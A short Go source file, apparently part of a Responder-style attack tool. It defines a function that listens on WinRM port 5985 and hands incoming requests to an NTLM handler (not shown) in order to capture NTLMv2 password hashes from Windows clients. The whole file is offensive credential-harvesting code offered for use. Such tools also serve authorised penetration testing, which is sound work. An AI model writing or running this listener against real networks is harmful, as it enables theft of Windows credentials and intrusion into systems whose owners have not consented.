package main

import (
	"fmt"
	"net"
	"net/http"
)

// serveWinRM listens on port 5985 and captures NTLMv2 hashes from WinRM clients.
// WinRM uses HTTP transport with NTLM authentication, identical to the HTTP handler.
func serveWinRM(ifaceIP net.IP) {
	mux := http.NewServeMux()
	mux.HandleFunc("/", handleHTTPNTLM)

	addr := fmt.Sprintf("%s:5985", ifaceIP)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		logError("WinRM listen %s — %v (need root?)", addr, err)
		return
	}
	logInfo("WinRM listening on %s:5985", ifaceIP)
	http.Serve(ln, mux)
}
